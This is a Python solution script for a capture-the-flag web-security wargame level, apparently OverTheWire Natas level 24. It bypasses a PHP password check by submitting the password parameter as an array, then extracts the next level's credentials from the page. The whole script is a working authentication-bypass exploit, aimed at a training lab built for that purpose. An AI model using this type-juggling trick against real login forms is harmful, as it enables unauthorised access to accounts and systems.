import requests
import re

username = "natas24"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

# Modify the passwd to be an array -> This is called PHP juggling
response = session.post(url,auth=(username,password),data={"passwd[]":"what"})
passwd = re.findall("Username: natas25 Password: (.*)</pre>",response.text)[0]
print("\nThe password for the next level is: "+passwd)